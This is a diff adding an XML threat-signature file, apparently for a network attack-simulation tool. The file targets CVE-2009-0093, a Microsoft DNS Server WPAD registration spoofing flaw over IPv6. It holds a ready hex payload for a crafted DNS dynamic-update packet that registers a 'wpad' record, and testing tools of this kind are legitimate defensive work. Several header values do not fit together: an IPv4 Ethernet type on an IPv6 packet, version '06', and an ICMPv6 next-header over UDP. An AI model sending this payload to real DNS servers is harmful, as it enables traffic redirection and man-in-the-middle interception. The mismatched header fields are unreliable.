@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft DNS Server WPAD Registration Spoofing (IPv6 Version)"/>
+    <EngDesc display="true" value="A spoofing vulnerability exists in Microsoft DNS Server which might allow a man-in-the-middle attack to be performed. The vulnerability is due to the way DNS Server handles dynamic update registration messages.            Remote attackers can exploit this vulnerability by sending a crafted WPAD registration message to the target server. Successful exploitation can allow an attacker to redirect Internet traffic and successfully perform a man-in-the-middle attack. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="DNS/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Windows"/>
+      <item value="Microsoft_Microsoft_Windows_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_2000"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20090310-16"/>
+    <CVEID display="true" value="CVE-2009-0093"/>
+    <bugtraqID display="true" value="33989"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="c17beb51d3b3b45f5d0c8a260014d2c0"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value="Partial"/>
+    <IntegImpact display="false" value="Partial"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1240005076"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1239995895" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="I"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="J"/>
+    <NamedVar name="DNSdestPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026,65535)" destPort="$DNSdestPort" checksum="51B5" length="00E1" Payload="79D228000001000100020001047465737403636F6D00000600010477706164047465737403636F6D00000500FE000000000000C01A000100FF000000000000C01A00010001000004B00004AC10046409313132302D6D732D3707322D34336239652434323934663433632D306461372D313164652D373638332D3030306332393234656330650000FA00FF00000000004803677373096D6963726F736F667403636F6D00000049B6BC2F8CA00025602306092A864886F71201020201011100FFFFFFFFE1B7C197D602DB27A1A128684BDD963779D200000000"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <UDP srcPort="" destPort="" checksum="A4AC" length="00E1" Payload="79D2A8000001000100020001047465737403636F6D00000600010477706164047465737403636F6D00000500FE000000000000C01A000100FF000000000000C01A00010001000004B00004AC10046409313132302D6D732D3707322D34336239652434323934663433632D306461372D313164652D373638332D3030306332393234656330650000FA00FF00000000004803677373096D6963726F736F667403636F6D00000049B6BC2F8CA00025602306092A864886F71201020201011100FFFFFFFFB2C623FEC89CAFAFE806DB562908CD4E79D200000000"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
